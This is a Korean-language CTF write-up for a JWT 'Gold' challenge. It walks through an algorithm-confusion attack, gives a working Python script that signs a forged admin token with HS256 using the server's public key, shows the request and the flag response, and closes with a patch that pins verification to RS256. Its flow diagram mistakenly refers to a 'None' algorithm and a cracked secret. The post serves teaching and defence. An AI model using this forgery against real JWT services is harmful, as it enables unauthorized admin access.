+++
title = "VulnABLE CTF [LUXORA] Write-up: JWT Attacks 🥇 Gold"
date = "2026-03-14"
[extra]
categories = "pentesting"
tags = ["CTF", "LUXORA", "JWT", "Gold", "Algorithm Confusion", "Public Key", "Write-up"]
+++

# VulnABLE CTF [LUXORA] Write-up: JWT Attacks 🥇 Gold

## 🎯 챌린지 개요
- **카테고리**: Authentication Layer (JWT Attacks)
- **난이도**: 🥇 Gold
- **타겟 경로**: `/jwt/gold`
- **목표**: 비대칭 키(RS256)를 사용하는 JWT 환경에서, 서버가 제공한 공개키(Public Key)를 대칭 키(HS256)의 비밀키로 둔갑시키는 알고리즘 혼동 공격을 통해 관리자 권한을 획득하라.

---

## 🕵️‍♂️ 1. 정보 수집 및 시스템 분석 (Reconnaissance)

`/jwt/gold` 환경에 접속하여 발급된 JWT를 확인해 보면, 헤더의 `alg` 값이 이전의 `HS256`이 아닌 `RS256`으로 설정되어 있습니다.

**[획득한 JWT 헤더]**
```json
{
  "alg": "RS256",
  "typ": "JWT"
}
```

RS256은 비대칭 암호화(RSA) 알고리즘입니다. 즉, 서버는 자신만이 가진 **개인키(Private Key)**로 서명을 만들고, 누구나 볼 수 있는 **공개키(Public Key)**로 그 서명이 진짜인지 검증합니다.

### 🔍 공개키 확보
비대칭 키 환경에서는 클라이언트(또는 다른 서버)도 토큰을 검증할 수 있어야 하므로 공개키를 외부에 노출해 둡니다.
웹 서버를 디렉터리 브루트포싱 하거나 잘 알려진 경로(`/.well-known/jwks.json` 등)를 탐색한 결과, `/public.pem` 경로에서 공개키 파일을 찾았습니다.

```http
GET /public.pem HTTP/1.1
```
```text
-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAyYqG...
...
-----END PUBLIC KEY-----
```

**[해커의 사고 과정]**
1. 이 서버는 클라이언트가 보낸 JWT의 서명을 검증할 때 저 `public.pem` 파일을 사용할 것이다.
2. 하지만 서버 라이브러리가 "토큰 헤더에 명시된 알고리즘"을 그대로 신뢰한다면 치명적인 버그가 생긴다.
3. 내가 토큰 헤더를 `alg: HS256` (대칭키)으로 바꿔서 보낸다면?
4. 서버는 "어? 이 토큰은 HS256이네? 그럼 내가 가진 검증키(`public.pem`)를 그냥 비밀문자열(Secret)로 간주하고 서명을 검증해야지!" 라고 오작동할 것이다.

---

## 💥 2. 알고리즘 혼동 공격 (Algorithm Confusion) 수행

### 📊 공격 흐름도 (Attack Flow)

```text
[ Attacker ]
|-- Decodes JWT
|-- Modifies Payload (role: admin)
|-- Signs with 'None' alg / Cracked Secret --> [ Web Server ]
                                               |-- Trusts JWT
```


이제 파이썬(Python)을 사용하여, 공개키 파일의 내용 전체를 하나의 거대한 "비밀번호"처럼 취급하여 HS256 서명을 생성하는 스크립트를 작성합니다.

### 💡 파이썬 익스플로잇 스크립트 작성

```python
import hmac
import hashlib
import base64
import json

# 1. 서버에서 다운로드한 공개키 원본 (줄바꿈과 띄어쓰기가 완벽히 일치해야 함)
public_key = b"""-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAyYqG...
...
-----END PUBLIC KEY-----
"""

# 2. 조작할 헤더와 페이로드 설정
# RS256을 HS256으로 변조하고, 권한을 admin으로 격상
header = {"alg": "HS256", "typ": "JWT"}
payload = {"username": "hacker", "role": "admin"}

# Base64Url 인코딩 함수
def b64url_encode(data):
    return base64.urlsafe_b64encode(data).replace(b'=', b'')

encoded_header = b64url_encode(json.dumps(header).encode())
encoded_payload = b64url_encode(json.dumps(payload).encode())

# 3. 서명할 메시지 구성 (Header + "." + Payload)
message = encoded_header + b"." + encoded_payload

# 4. 공개키를 '비밀키(Secret)'로 사용하여 HMAC-SHA256 서명 생성!
signature = hmac.new(public_key, message, hashlib.sha256).digest()
encoded_signature = b64url_encode(signature)

# 5. 최종 위조 토큰 완성
forged_token = message + b"." + encoded_signature
print("[+] Forged Admin Token:")
print(forged_token.decode())
```

스크립트를 실행하여 생성된 위조 토큰을 복사합니다.

---

## 🚀 3. 토큰 전송 및 익스플로잇 (Exploitation)

위조된 토큰을 쿠키에 덮어쓰고 관리자 페이지에 접근합니다.

```http
GET /jwt/gold/admin HTTP/1.1
Cookie: token=[파이썬으로 생성한 위조 토큰]
```

### 🔍 서버의 응답
서버 내부의 취약한 로직(`jwt.verify(token, publicKey)`)은 헤더의 `HS256`을 보고, 두 번째 인자로 전달된 `publicKey` 문자열을 대칭키 삼아 검증을 시도합니다. 그리고 해커가 보낸 서명과 정확히 일치함을 확인하고 관리자 페이지를 열어줍니다!

```json
{
  "status": "success",
  "message": "Welcome Admin! High Security Area Accessed.",
  "flag": "FLAG{JWT_🥇_ALG_CONFUSION_H7J8K9}"
}
```

---

## 🚩 4. 롸잇업 결론 및 플래그

클라이언트가 제공한 헤더 정보를 맹신하는 서버 로직의 맹점을 찔러, 비대칭 암호화의 근간을 뒤흔드는 알고리즘 혼동 공격을 성공시켰습니다.

**🔥 획득한 플래그:**
`FLAG{JWT_🥇_ALG_CONFUSION_H7J8K9}`

### 🛡️ 취약점 원인 및 패치 방안 (Remediation)
개발자가 검증 함수(`jwt.verify`)를 호출할 때, "어떤 알고리즘을 기대하는지" 명시하지 않았기 때문에 발생한 취약점입니다.

* **취약한 방어 코드 예시**
```javascript
// publicKey를 주긴 했지만, 알고리즘을 강제하지 않아 토큰 헤더의 alg를 따라감
const decoded = jwt.verify(token, publicKey); 
```

* **안전한 패치 코드 (알고리즘 명시)**
```javascript
// 반드시 RS256 알고리즘으로 서명된 토큰일 경우에만 publicKey로 검증하도록 강제함
const decoded = jwt.verify(token, publicKey, { algorithms: ['RS256'] });
```
위와 같이 `{ algorithms: ['RS256'] }` 옵션을 추가하면, 해커가 토큰 헤더를 `HS256`으로 변조해서 보내더라도 라이브러리 레벨에서 알고리즘 불일치 에러를 뱉어내며 검증을 즉시 거부하게 됩니다.